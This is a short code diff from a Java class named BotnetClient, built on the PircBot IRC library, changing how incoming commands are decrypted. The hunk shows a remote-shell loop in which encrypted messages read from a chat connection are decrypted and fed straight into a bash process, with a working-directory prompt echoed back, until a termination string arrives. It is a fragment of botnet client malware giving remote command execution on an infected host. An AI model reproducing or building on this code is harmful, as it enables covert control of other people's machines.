@@ -392,12 +392,12 @@ public class BotnetClient extends PircBot {
 	    public void run() {
 	    	try {
 	    		bashin.println("echo `pwd` '$: '");
-	        	String command = m.decryptMsgNonce(chat.readLine());
+	        	String command = m.decryptMsg(chat.readLine());
 	    		while (command != null && !command.equalsIgnoreCase(TERMINATION) && !terminate) {
 	        		System.out.println("command: " + command);
 	        		bashin.println(command);
 	        		bashin.println("echo `pwd` '$: '");
-	        		command = m.decryptMsgNonce(chat.readLine());
+	        		command = m.decryptMsg(chat.readLine());
 	        	}
 	        	bashin.println("exit 0");
 	    	} catch (Exception e) {
